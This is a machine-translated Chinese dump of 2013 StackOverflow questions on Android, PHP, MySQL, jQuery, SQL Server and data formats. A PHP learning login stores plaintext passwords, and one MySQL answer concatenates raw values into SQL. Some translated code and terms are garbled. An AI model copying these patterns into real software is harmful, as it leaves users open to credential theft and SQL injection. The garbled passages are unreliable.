# StackOverflow 问答 15154000-15154999

# android - Android：如何在rndis初始化阶段捕获网络数据包？

> ID：15154001
> 
> 赞同：0
> 
> 时间：2013-03-01T09:02:44.237
> 
> 标签：android, networking

尝试将 android rndis tethering 与 windows PC 连接。Windows ip地址是169.254.xx直到一分钟后，再次dhcp协商，ip变成192.168.xx

使用 android 输出进行调试，我看到了网络共享服务和 dnsmasq 已启动。dnsmasq 在一分钟内收到 dhcp discover。绑定后的预期行为应该是 dhcp。

使用 tcpdump，但是当适配器存在更改时它会停止。如果我再试一次，在初始化阶段丢失网络数据包。

在 Windows 端尝试了 wireshark/网络监视器，我必须绑定一个适配器。仍然缺少初始化阶段的网络数据包。

在适配器早期阶段捕获网络日志的任何工具（android 或 windows）？我看到 WindowsCE netlog 转储所有数据，因为它基于 ndis。对于以太网网卡，我可以尝试集线器和网络监视器 P 模式，但集线器不适用于 usb rndis。

顺便说一下，我和高通usb工程师讨论过。从usb驱动，调试没有错误。感谢其他调试想法。

谢谢，-约翰尼

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T06:59:14.250

windows etl 可以转储组件跟踪和网络流量。针对我的 dhcp 问题，如果客户端是 win7，请使用“netsh dhcpclient trace dump”获取 dhcp 日志。netfilter 可能有助于收集 linux 端流量。

# android - 从 GooglePlay 下载的 Android apk 在固件 4.1.1 更新后崩溃

> ID：15154003
> 
> 赞同：1
> 
> 时间：2013-03-01T09:02:47.300
> 
> 标签：android, crash, android-4.2-jelly-bean

我在 Google Play 中有一个游戏。在前 3 次更新中，它一直运行良好。但在您下载并安装更新后的第 4 次游戏仅在 Android 4.1.1 设备中崩溃。

发生这种情况是因为 GooglePlay 以某种方式错误地安装了应用程序并且未正确设置本机库。

阅读一些谷歌表格，我相信这是那个 android 固件的已知问题。我已经通过将本机库保存在 res 文件中并对其进行处理`/data/data/com.minix.android.Game/files`并从那里加载它来解决这个问题。然而，玩家失去了所有的进度，就像损坏的安装清除了游戏数据一样。

```
02-28 15:40:49.050: W/dalvikvm(23159): Exception Ljava/lang/UnsatisfiedLinkError;     thrown while initializing Lcom/minix/android/Game;
02-28 15:40:49.050: W/dalvikvm(23159): Class init failed in newInstance call (Lcom/minix/android/Game;)
02-28 15:40:49.050: D/AndroidRuntime(23159): Shutting down VM
02-28 15:40:49.050: W/dalvikvm(23159): threadid=1: thread exiting with uncaught exception (group=0x410382a0)
02-28 15:40:49.050: D/KeyguardViewMediator(2465): setHidden false
02-28 15:40:49.050: D/WindowManager(2465): mInputFocus is not null.
02-28 15:40:49.050: D/WindowManager(2465): mInputFocus is not null.
02-28 15:40:49.050: E/AndroidRuntime(23159): FATAL EXCEPTION: main
02-28 15:40:49.050: E/AndroidRuntime(23159): java.lang.ExceptionInInitializerError
02-28 15:40:49.050: E/AndroidRuntime(23159):    at java.lang.Class.newInstanceImpl(Native Method)
02-28 15:40:49.050: E/AndroidRuntime(23159):    at java.lang.Class.newInstance(Class.java:1319)
02-28 15:40:49.050: E/AndroidRuntime(23159):    at android.app.Instrumentation.newActivity(Instrumentation.java:1068)
02-28 15:40:49.050: E/AndroidRuntime(23159):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2015)
02-28 15:40:49.050: E/AndroidRuntime(23159):    at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2125)
02-28 15:40:49.050: E/AndroidRuntime(23159):    at android.app.ActivityThread.access$600(ActivityThread.java:140)
02-28 15:40:49.050: E/AndroidRuntime(23159):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1227)
02-28 15:40:49.050: E/AndroidRuntime(23159):    at android.os.Handler.dispatchMessage(Handler.java:99)
02-28 15:40:49.050: E/AndroidRuntime(23159):    at android.os.Looper.loop(Looper.java:137)
02-28 15:40:49.050: E/AndroidRuntime(23159):    at android.app.ActivityThread.main(ActivityThread.java:4898)
02-28 15:40:49.050: E/AndroidRuntime(23159):    at java.lang.reflect.Method.invokeNative(Native Method)
02-28 15:40:49.050: E/AndroidRuntime(23159):    at java.lang.reflect.Method.invoke(Method.java:511)
02-28 15:40:49.050: E/AndroidRuntime(23159):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:1008)
02-28 15:40:49.050: E/AndroidRuntime(23159):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:775)
02-28 15:40:49.050: E/AndroidRuntime(23159):    at dalvik.system.NativeStart.main(Native Method)
02-28 15:40:49.050: E/AndroidRuntime(23159): Caused by: java.lang.UnsatisfiedLinkError: Couldn't load minix: findLibrary returned null
02-28 15:40:49.050: E/AndroidRuntime(23159):    at java.lang.Runtime.loadLibrary(Runtime.java:365)
02-28 15:40:49.050: E/AndroidRuntime(23159):    at java.lang.System.loadLibrary(System.java:535)
02-28 15:40:49.050: E/AndroidRuntime(23159):    at com.minix.android.Game.GameActivity <clinit>(Unknown Source)
02-28 15:40:49.050: E/AndroidRuntime(23159):    ... 15 more 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T09:17:00.683

可能导致这种情况的几个原因：

*   你的代码中没有这个：

静态 { System.loadLibrary("mylibraryname"); }

*   您在代码或包本身中更改了包名称，但它们不匹配。

*   您使用过期或无效的签名来签署您的应用程序。

# php - php 检查txt文件中的匹配项

> ID：15154011
> 
> 赞同：1
> 
> 时间：2013-03-01T09:03:30.387
> 
> 标签：php

嗨，我正在创建一个简单的登录系统。我知道我做的方式是完全不安全的，但它只是为了学习目的，因为我是 php 新手。我在验证时遇到问题，现在它不报告用户名或密码是否存在于 txt 文件中。我还将使用会话（未完全实现）来跟踪用户是否登录。

```
 <?php 
      session_start(); // session

       if(isset($_POST['register'])) //  Register USER
    {
      $user  = $_POST['username'];
      $password=$_POST['password'].PHP_EOL;
      $fh = fopen("file.txt","a+");
      fwrite($fh,$user." ".$password); //write to txtfile
      fclose($fh);
    } 
```

txt 文件中的输出如下所示：

```
 user1 password1
      user2 password2 
```

这是我需要帮助的地方

```
 if(isset($_POST['Login']))
      {
      $_SESSION['username']=$user; 
  $_SESSION['password']=$password;

  $file = file_get_contents("file.txt");

 if (strpos($file, "$user $password".PHP_EOL) !== false) 
  {
     // go to login page
  }
  else 
{ 
     //ERROR
}

    ?> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T09:06:21.227

`file_get_contents()`接受文件名，而不是文件指针，因此您应该使用`file_get_contents('file.txt')`并摆脱`fopen`调用。

[http://php.net/manual/en/function.file-get-contents.php](http://php.net/manual/en/function.file-get-contents.php)

然后， 的值`$file`是一个字符串，其中包含文件的所有内容作为单个字符串。所以你可以使用普通的字符串操作，不需要任何`feof`东西。

但是，您可能想查看`file()`，它可能对您有用：

[http://php.net/manual/en/function.file.php](http://php.net/manual/en/function.file.php)

编辑：

你的逻辑也有问题。

您首先检查用户名，然后检查密码作为单独的操作。这将匹配具有*任何*用户密码的*任何用户。*假设我们有用户 alice 的密码为“foo”，bob 的密码为“bar”，按照当前的逻辑，alice 将能够使用“foo”或“bar”作为密码登录。

所以你真正要找的是一个字符串，它是用户名和密码的连接，它在文件中找到（例如`"alice foo".PHP_EOL`）：

```
if (strpos($file, "$user $password".PHP_EOL) !== false) {
    // go to login page
} else {
    // error
} 
```

您需要`PHP_EOL`在其中的原因是这是您用来标记记录结尾的内容。如果您不将它放在搜索字符串中，那么您将匹配真实密码的任何子字符串，包括空密码。（文件包含文本`"alice foo".PHP_EOL`，它包含文本`"alice "`，但不包含文本`"alice ".PHP_EOL`）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T09:06:52.207

问题在这里：

```
$fp = fopen ("file.txt", "r"); // read from file
$file = file_get_contents($fp); 
```

使用`fopen`您可以逐行读取文件，并`file_get_contents`通过将文件名指定为参数而不是文件句柄来获取整个文件内容作为字符串。

你把两者混为一谈了。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-01T09:52:35.410

引号内的 php 变量的行为就像字符串 $_SESSION['username']="$user"; 像这样使用它 $_SESSION['username']=$user;

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T09:19:18.843

由于您正在学习，我不会给您代码，但可以通过“\n”给您逻辑爆炸然后通过空格爆炸结果数组值

检查数组值 0 和 1 是否等于用户名和密码，如果相同则成功

仍有任何疑问随时提问

# owl - 将wsdl转换为猫头鹰

> ID：15154012
> 
> 赞同：0
> 
> 时间：2013-03-01T09:03:35.910
> 
> 标签：owl

我需要将一些 wsdl 文件转换为 owls。这些 owls 文件应该包含用于配置文件、流程和接地的单独段。我已经在“owl-s-1.1.0-beta”中尝试过“wsdl2owls.bat”，但在输出文件中，配置文件和进程标签彼此没有分开的段。你能帮我解决我的问题吗？

提前致谢，

苏德。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-03T10:11:27.957

试试马耳他大学 James Scicluna 博士提供的 OWL-S 编辑器。它提供了单独的服务、配置文件、流程和接地模型。

[http://staff.um.edu.mt/cabe2/supervising/undergraduate/owlseditFYP/OwlSEdit.html](http://staff.um.edu.mt/cabe2/supervising/undergraduate/owlseditFYP/OwlSEdit.html)

# c# - NetValidatePasswordPolicy 不评估密码复杂性规则，而只评估长度

> ID：15154023
> 
> 赞同：3
> 
> 时间：2013-03-01T09:04:16.033
> 
> 标签：c#, c++, validation, passwords, complexity-theory

我正在尝试使用 NetValidatePasswordPolicy API 评估是否满足密码复杂性规则。我为此找到了很多样本​​，但没有一个对我有用。

我尝试了不同的方法来使用 API`NetValidatePasswordReset`和`NetValidatePasswordChange`Parameter，但结果总是一样的。

我的问题是，API 只测试密码长度。如果密码太短，我会收到错误 2245（这意味着密码太短），但是当我输入一个完全不符合复杂性规则的较长密码时，我会返回一个成功代码（而不是`PasswordNotComplexEnough`）。

有没有人得到这个 API 功能的工作？请帮助并感谢您的支持。

下面是不起作用的代码。我在两个不同的系统上尝试过。一种是连接到 Active Directory 域的 Windows 8。另一个是同域的域服务器（运行 Windows Server 2008 R2）。

```
#pragma once
#include <windows.h> 
#include <lm.h> 
#include <stdio.h> 
#include <vcclr.h>
#pragma comment(lib, "Netapi32.lib") 

using namespace System;
using namespace System::Runtime::InteropServices;

namespace PasswordPolicyCheck {

    public ref class srPasswordValidator 
    { 
    //public : static const int PasswordValidationSuccess = NERR_Success;
    //public: static const int PasswordAccountLockedOut = NERR_AccountLockedOut;
    //public: static const int PasswordTooRecent = NERR_PasswordTooRecent;
    //public: static const int PasswordBadPassword = NERR_BadPassword;
    //public: static const int PasswordHistConfilct = NERR_PasswordHistConflict;
    //public: static const int PasswordTooShort = NERR_PasswordTooShort;
    //public: static const int PasswordTooLong = NERR_PasswordTooLong;
    //public: static const int PasswordNotComplexEnough = NERR_PasswordNotComplexEnough;
    //public: static const int PasswordFlterError = NERR_PasswordFilterError;

        public :int ValidatePassword(String^ userName, String^ password, String^ domainController) 
        { 

            LPWSTR wzPwd = static_cast<LPWSTR>(Marshal::StringToBSTR(password).ToPointer()); 
            LPWSTR wzUser = static_cast<LPWSTR>(Marshal::StringToBSTR(userName).ToPointer()); 
            LPWSTR  wzServer = static_cast<LPWSTR>(Marshal::StringToBSTR(domainController).ToPointer()); 

            NET_VALIDATE_OUTPUT_ARG* Output = NULL; 
            NET_VALIDATE_PASSWORD_RESET_INPUT_ARG Input = {0}; 
            //NET_VALIDATE_PASSWORD_CHANGE_INPUT_ARG Input = {0}; 

            Input.ClearLockout = true;
            Input.PasswordMustChangeAtNextLogon = false;
            Input.UserAccountName = wzUser;
            Input.ClearPassword = wzPwd;
            //Input.PasswordMatch = TRUE;

            /*NET_VALIDATE_PASSWORD_HASH PasswordHistory;
            size_t lLength = wcslen(wPassword);
            PasswordHistory.Length = lLength;
            PasswordHistory.Hash = new BYTE[lLength];
            memcpy(PasswordHistory.Hash, wPassword, lLength);
            Input.HashedPassword = PasswordHistory;
            Input.InputPersistedFields.PresentFields = NET_VALIDATE_PASSWORD_HISTORY | NET_VALIDATE_PASSWORD_HISTORY_LENGTH;*/

            DWORD dwErr = NetValidatePasswordPolicy (wzServer, NULL, _NET_VALIDATE_PASSWORD_TYPE::NetValidatePasswordReset, &Input, (void **) &Output); 
            int ReturnValue = Output->ValidationStatus;
            NetValidatePasswordPolicyFree ((void **) &Output); 
            return ReturnValue;
        } 
    }; 

} 
```

# macos - 当另一个 Cocoa 应用程序终止时通知一个 Cocoa 应用程序

> ID：15154026
> 
> 赞同：0
> 
> 时间：2013-03-01T09:04:41.010
> 
> 标签：macos, cocoa, nsnotificationcenter, nsapplication, nsworkspace

假设有两个可可应用程序 APP1 和 APP2。我希望在 APP1 终止时通知 APP2。我想要一些在 APP2 中注册的回调函数，它会在 APP1 终止后立即调用。我怎样才能做到这一点？任何示例代码都将受到高度赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T09:28:20.817

你可以观察到`NSWorkspaceDidTerminateApplicationNotification`。它的`userInfo`字典包含有关哪个应用程序被终止（一个`NSRunningApplication`对象）的详细信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:19:43.013

您肯定在寻找[NSDistributedNotificationCenter](http://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSDistributedNotificationCenter_Class/Reference/Reference.html#//apple_ref/occ/cl/NSDistributedNotificationCenter)。

每当您想从一个应用程序向其他应用程序发送通知时，就像 XCode3.2 和 Interface Builder 发送通知一样，请使用**NSDistributedNotificationCenter**。

本文档包含示例代码，例如 DockTile，对您很方便。

# android - 在 imageview 中加载大尺寸图像问题。位图太大，无法上传到纹理中

> ID：15154031
> 
> 赞同：6
> 
> 时间：2013-03-01T09:05:00.333
> 
> 标签：android, drawable

我在可绘制文件夹中有 270 x 2693 像素的图像。当我尝试在 imagview 中设置该图像时，我的**位图太大而无法上传到纹理**警告中。

图像在 android 设备 < 4.0 但不设置 > 4.0 设备中完美设置。

请帮我解决这个问题。

**代码**

```
<ImageView
   android:id="@+id/imageView"
   android:layout_width="fill_parent"
   android:layout_height="wrap_content"
   android:scaleType="fitXY"
   android:contentDescription="@string/name"
   android:src="@drawable/hindi" /> 
```

这里印地语是可绘制文件夹中的图像，其大小为 270 x 2693 像素。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-11-01T16:12:11.287

## 问题

此问题通常与 OpenGL 最大纹理大小或设备内存有关。您得到的完整错误可能类似于

> W/OpenGLRenderer(12681)：位图太大，无法上传到纹理中（270x2693，max=2048x2048）

内存通常是大尺寸图像的问题，但在您的情况下，270x2693 是 727110 像素。如果您在 RGBA 中，则每个像素为 4 个字节，因此 727110 * 4 = 2908440 字节，大约为 2.7 兆字节。这应该适合任何设备。

因此，您的问题可能与 OpenGL 有关。可能发生的情况是您正在测试的 Android 设备 > 4.0 检测到您的图像对于 OpenGL 来说太大并为您调整大小，而旧设备则没有。

**编辑：**

就我而言，问题是我的 640x1136 初始图像似乎会自动调整为 1280x2272 图像大小以适应我的设备大屏幕。这也会触发您遇到的错误消息。

如果您进一步收到此错误，则它与用于加载图像的 dpi 有关。正如您将在 Android 参考中发现的那样，设备将加载有关其 dpi 的图像，这可以改变加载到内存中的图像的大小。

## 解决方案

*   除了检测设备大小以正确加载图像之外，您别无选择。

    了解如何[在内存中加载大型位图](http://developer.android.com/training/displaying-bitmaps/load-bitmap.html)。

*   您还可以为不同的设备 dpi 使用不同的图像尺寸，这可以由 Android 从 Drawable 文件夹中自动选择。

    请参阅[如何支持屏幕](http://developer.android.com/guide/practices/screens_support.html#support)，它会告诉您如何设置文件夹。

*   如前所述，使用较小的图像或减小其大小。

## 相关信息

如果您需要[支持多个屏幕](http://developer.android.com/guide/practices/screens_support.html#testing)，我建议您看看那里。

Android 还会收集用户每 7 天更新一次的[屏幕尺寸](http://developer.android.com/about/dashboards/index.html#Screens)数据。

还可以看看[这个有趣的答案](https://stackoverflow.com/a/6310127/62921)，它指出了一个了解内存中图像大小的好网站。

最后，如果您已经在您的应用程序中使用 OpenGL，请查看[这个答案，它显示了如何检测最大 OpenGL 纹理大小](https://stackoverflow.com/a/15314838/62921)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T10:16:32.460

为什么不减小图像的大小？如果您不想这样做，那么不要在 XML 中指定位图，而是从程序代码中加载它，然后对其进行缩放以适应显示。有关加载大型位图的更多信息，请参阅[本指南。](http://developer.android.com/training/displaying-bitmaps/load-bitmap.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-04-20T12:55:49.547

尝试使用此代码

```
int[] maxTextureSize = new int[1];
GLES10.glGetIntegerv(GL10.GL_MAX_TEXTURE_SIZE, maxTextureSize, 0); 
```

maxTextureSize 存储解码图像的大小限制，例如 4096x4096、8192x8192 。请记住在**MainThread**中运行这段代码，否则您将得到零。

# redirect - 301 永久野重定向

> ID：15154040
> 
> 赞同：0
> 
> 时间：2013-03-01T09:05:21.830
> 
> 标签：redirect, litespeed

需要帮助重定向任何网址，例如：

[http://www.example.com/](http://www.example.com/) *.html

至：

[http://www.example.com/forums/](http://www.example.com/forums/) *.html

我正在使用 Litespeed。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-30T01:55:21.107

我在我的 lite speed 服务器上使用它：

```
Options +FollowSymLinks
RewriteEngine On

RewriteCond %{REQUEST_URI} ^(.*\.html)$
RewriteRule (.*) http://www.example.com/forums/$1? [R=301,L] 
```

以及检查它是否有效，你可以使用这个网站，当我弄清楚它时它对我有很大帮助：

[http://htaccess.madewithlove.be/](http://htaccess.madewithlove.be/)

一般来说，您似乎可以在 litespeed 中使用与 apache 中相同的命令

干杯，

威廉

# python - 当正常的 for 循环正常工作时，列表理解不起作用

> ID：15154042
> 
> 赞同：2
> 
> 时间：2013-03-01T09:05:26.370
> 
> 标签：python

即使 for 循环正常工作，我也无法让我的列表理解语句工作。我用它来创建一个带有reportlab的表类的表

```
# Service Table
heading = [('Service', 'Price', 'Note')]

# This doesn't work as in there is no row in the output
heading.append([(s['name'],s['price'],s['note']) for s in services])
table = Table(heading)

# This displays the table correctly
for s in services:
    heading.append((s['name'], s['price'], s['note']))
table = Table(heading) 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-01T09:06:24.767

使用`extend`代替`append`：

```
heading.extend((s['name'],s['price'],s['note']) for s in services) 
```

`append`创建一个新元素并获取它得到的任何东西。如果它得到一个列表，它会将这个列表作为一个新元素附加。

`extend`获取一个可迭代对象并添加与该可迭代对象包含的一样多的新元素。

```
a = [1, 2, 3]
a.append([4,5])
# a == [1, 2, 3, [4, 5]]

a = [1, 2, 3]
a.extend([4,5])
# a == [1, 2, 3, 4, 5] 
```

# javascript - 什么以及为什么定义javascript函数第二个参数的技术未定义？

> ID：15154043
> 
> 赞同：-2
> 
> 时间：2013-03-01T09:05:26.403
> 
> 标签：javascript

在下面`javascript`保留的第二个参数代码中`undefined`，为什么会这样？

```
(function(a,b){
   ...
})(window) 
```

这背后的技术是什么？有关此技术的任何参考资料？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:07:31.877

你大约一个小时前问过这个问题。你期待什么？你给出了第一个参数，之后 javascript 试图找到其他参数。如果没有为函数提供更多参数，则所有其他参数（在您的情况下为 b）将设置为未定义。Javascript 不像 C++ 或 java。没有编译时错误，因为 javascript 未编译。所以它试图自己解决问题。在这种情况下，如果您传递的参数数量较少，它会将其他参数设置为未定义并有效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:07:41.377

在这里，您需要匿名函数中的 2 个参数，但您只提供单个参数 ( `window`)。因此第二个参数总是未定义的。

# mysql - 为什么mysql查询在phpmyadmin上工作但在php上出错

> ID：15154044
> 
> 赞同：-1
> 
> 时间：2013-03-01T09:05:30.560
> 
> 标签：mysql, sql, phpmyadmin, php

我有一个可以在 phpmyadmin 上正常工作的 sql 查询，但是 php mysql_Query 上的 SQL 语法错误

询问：

```
 SELECT `_id` INTO @task_id  
   FROM `SepidarSoft_Portal`.`Permission` 
   WHERE `FID`='1' and `GID`='Request' and `Permission`='Client' ;

   INSERT INTO `SepidarSoft_Portal`.`Permission` 
   SET `_id`=@task_id,`CTime`='1362128156',`CUser`='1',`FID`='1',`KFID`='0',`GID`='Request',`KGID`='1',`Permission`='Client',`Expired`='0',`Direction`='1',`Access`='200',`State`='1' 
   ON DUPLICATE KEY UPDATE `CTime`='1362128156',`CUser`='1',`FID`='1',`KFID`='0',`GID`='Request',`KGID`='1',`Permission`='Client',`Expired`='0',`Direction`='1',`Access`='200',`State`='1' 
```

mysql_query 显示此错误

> 添加您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以获取在 'INSERT INTO 附近使用的正确语法`SepidarSoft_Portal`。`Permission`SET `_id`=@task_id, `CTime`='13621' 在第 2 行

有谁知道问题是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T09:14:26.443

> **[mysql_query](http://php.net/manual/en/function.mysql-query.php)**
> 
> mysql_query()向与指定链接标识符关联的服务器上当前活动的数据库**发送一个唯一查询**（不支持多个查询）。

**因此单独执行你的语句**，这样更安全。

或者，如果您坚持使用`mysql_*`扩展名，您可以使用`mysqli_multi_query()`

> **[mysqli_multi_query](http://php.net/manual/en/mysqli.multi-query.php)**
> 
> 执行一个或多个由分号连接的查询。

但你最好切换到`PDO`或`mysqli_*`扩展。`mysql_*`已弃用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T09:14:59.603

您需要在单独的命令中执行这两个查询。也不要听那些建议你使用的人，`mysql_query()`因为它已被**弃用**。请改用[mysqli_query()](http://www.php.net/manual/en/mysqli.query.php)或[PDO](http://www.php.net/manual/en/book.pdo.php)函数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T09:09:04.070

您需要在 PHP 中将它们作为 2 个单独的 sql 查询运行。因此，使用 2 条 mysql_query() 语句，您将不再收到错误消息。

此外，您应该考虑升级您的代码以不再使用 mysql_ 语句，因为它们已被弃用，而是使用 mysqli 或 PDO。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T09:09:46.300

原因如下：

> mysql_query() 向与指定链接标识符关联的服务器上当前活动的数据库发送一个唯一查询（不支持多个查询）。

**注意：**尽量避免 MySQL 扩展，尽量使用 PDO 或prepared statements 代替。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-01T09:22:05.390

你必须在下面使用：

```
INSERT INTO epidarSoft_Portal`.`Permission
         (column1, column2, column3, column4)
     VALUES
         ('" . $val1 . "',  '" . $val2 . "', '" . $val3 . "', '" . $val4 . "')
     ON DUPLICATE KEY UPDATE
         column2='" . $val2 . "',
         column3='" . $val3 . "',
         column4='" . $val4 . "'"
 ); 
```

# java - XML 与 JSON。哪一个更适合存储小块数据？

> ID：15154049
> 
> 赞同：3
> 
> 时间：2013-03-01T09:06:12.440
> 
> 标签：java, android, xml, database, json

我想存储一小块数据，不想去任何数据库，我们有两个选择`XML`，`JSON`现在任何人都可以从性能和架构的角度建议我应该选择哪一个。

**1.哪个更好用？用于存储数据的 XML 或 JSON？**

**2\. JSON 和 XML 的优缺点是什么？**

任何帮助将不胜感激。

*编辑*

我们没有使用任何网络服务，我们的应用程序是一个独立的应用程序。我们希望使用 XML 或 JSON 来存储将在应用程序中使用的一些本地数据。数据就像问题和答案的详细信息、静态用户详细信息等。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-01T09:22:18.743

请记住，只有标签长于数据时，JSON 才会更小。可能是因为 XML 更容易阅读，而且 JSON 占用的空间更小。

**XML 优点**

*   更容易阅读
*   使用的比 JSON 多得多
*   主要行业标准之一
*   可以进行版本控制
*   命名空间支持
*   多个同名元素
*   验证

**XML 缺点**

*   占用更多空间
*   由于尺寸增加了带宽

**JSON 优点**

*   不占用太多空间
*   由于它的大小（占用空间）而使用更少的带宽
*   跻身主要行业标准之一

**JSON 缺点**

*   更难阅读
*   版本控制会破坏客户端/数据

如果您发送的数据多于发送的标签，那么它们大致相同，并且您最好使用 XML 来获得快速的解析速度。我还认为人们期望缓慢的移动加载时间和快速的应用程序运行时间，所以尽量不要通过使用较慢的格式来解析来减慢应用程序的时间。

最后我说**JSON**，占用空间小将加快您的应用程序和您尝试发送/接收数据的 Web 服务之间的事务。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-03-01T09:10:55.713

JSON 是设计任何移动应用程序开发的最佳方式，因为与 XML 相比，解析 JSON 是非常轻量级的操作。而XML解析总是会导致复杂的内存问题。并且 JSON 可以使用 GSON 库轻松构建/解析，该库又非常轻量级。

如果您要使用不同版本的解析器，XML 解析会很头疼。所以去JSON。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-03-01T09:10:13.280

可扩展标记语言 (XML) 是从标准通用标记语言 (SGML) 派生的文本格式。

XML 最令人兴奋的地方在于作为一种可互换数据序列化格式的新角色。XML 作为一种数据表示语言提供了两个巨大的优势：

```
It is text-based.
It is position-independent. 
```

与其他数据交换格式相比，这些共同促进了更高水平的应用程序独立性。XML 已经是 W3C 标准这一事实意味着没有什么可争论的了（或者看起来如此）。

不幸的是，XML 不太适合数据交换，就像扳手不适合打钉子一样。它背负着很多包袱，并且与大多数编程语言的数据模型不匹配。大多数程序员第一次看到 XML 时，都会对它的丑陋和低效感到震惊。事实证明，第一个反应是正确的。还有另一种文本表示法具有 XML 的所有优点，但更适合数据交换。该表示法就是 JavaScript 对象表示法 (JSON)。

关于 XML 的最有见地的意见（例如，请参阅 xmlsuck.org）表明 XML 作为数据交换格式存在很大问题，但其缺点被互操作性和开放性的好处所弥补。

JSON 承诺具有互操作性和开放性的相同好处，但没有缺点。

其余的比较在[这里](http://www.json.org/xml.html)。

# ios - iOS 推送通知 .p12 证书

> ID：15154052
> 
> 赞同：3
> 
> 时间：2013-03-01T09:06:20.743
> 
> 标签：ios, push-notification, apple-push-notifications

我无法创建 .p12 证书。由于某种原因它被禁用了。我在这里做错了什么？谢谢..

![在此处输入图像描述](../Images/c2d1cfa23c529cd67f33625b49c7f76e.png)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T09:13:33.583

如果您尝试导出，`Certificate`那么它会将格式设置为`.cer`. 要获取`.p12`文件，您需要导出`key`文件。在您的`Key Chain Access`, 在`Category`部分中，选择`Keys`。

![在此处输入图像描述](../Images/6d42d098118307e6afec07fa8e66bbff.png)

# c# - 如何使windows用户可以访问具有集成安全性的sql server？

> ID：15154060
> 
> 赞同：0
> 
> 时间：2013-03-01T09:06:42.810
> 
> 标签：c#, .net, sql-server, database, authentication

我有一个 Windows 用户，例如“User1”。而我这个 User1 可以访问我的数据库。

此代码用于在我的数据库中创建新登录名和新用户：

```
CREATE LOGIN user1
WITH PASSWORD = 'password1';
GO
CREATE USER user1 FOR LOGIN user1;
GO 
```

**编辑** 问题：

1）如何映射这两个用户：“User1”和“user1”？

2) 这个 Windows 用户“User1”是否可以访问具有集成安全性的 sql server？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T09:29:12.070

```
use master
GO

create login [<YourDomain>\User1] from windows;
GO

use [<YourDatabase>]
GO

create user [<YourDomain>\User1] from login [<YourDomain>\User1]
GO 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T09:30:15.507

使用 SQL Server Management Studio 创建登录。[这是如何做到的（MSDN 链接）](http://msdn.microsoft.com/en-us/library/aa337562.aspx)。

在同一页面中还提供了完成此操作的 TSQL 代码（此处复制粘贴太长，部分复制粘贴将毫无意义）。

# jquery - jquery 与 jquery 冲突

> ID：15154067
> 
> 赞同：0
> 
> 时间：2013-03-01T09:07:01.120
> 
> 标签：jquery

我想在 php 页面中使用两个 jquery 脚本，但两个 jquery 脚本相互冲突

**这是我的代码**

```
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
<script type="text/javascript" src="topslider/lib/jquery.jcarousel.min.js"></script> 
```

**冲突的 Jquery 脚本**

```
<script src="http://code.jquery.com/jquery-1.8.3.js"></script>
<script src="http://code.jquery.com/ui/1.10.0/jquery-ui.js"></script>
 <script>
  $(function() {
  $( "#datepicker" ).datepicker();
  });
  </script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T09:08:27.517

最好的办法是只包含**一次**jQuery 。我肯定会避开已经过时几年的 v1.4.2。连1.8.3都回了几个版本，或许看看用最新的（1.9.2）。（正如 leftclickben 在评论中指出的那样，您也可以使用更新版本的 jQuery UI，1.10.1。）

因此，如果您使用的轮播与最新版本兼容，这可能会起作用：

```
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.2/jquery.min.js"></script>
<script type="text/javascript" src="topslider/lib/jquery.jcarousel.min.js"></script>
<script src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.10.1/jquery-ui.min.js"></script> 
```

请注意，我对 jQuery 和 jQuery UI 都使用了 Google CDN。

* * *

如果您绝对**必须**包含 jQuery 的两个副本，您可以，但我强烈建议您避免使用它，并且它要求您使用的插件正确编写（这绝不是保证）：

```
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
<script type="text/javascript" src="topslider/lib/jquery.jcarousel.min.js"></script>
<script>
var jq142 = jQuery.noConflict(true);
</script>
<script src="http://code.jquery.com/jquery-1.8.3.js"></script>
<script src="http://code.jquery.com/ui/1.10.0/jquery-ui.js"></script> 
```

现在，`jq142`指的是 jQuery 1.4.2，`jQuery`并且`$`都指的是 jQuery 1.8.3。

但同样，我会避免这种情况。如果您有需要 jQuery 1.4.2 的插件，我建议您找到维护的替代品。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-02-24T13:53:02.400

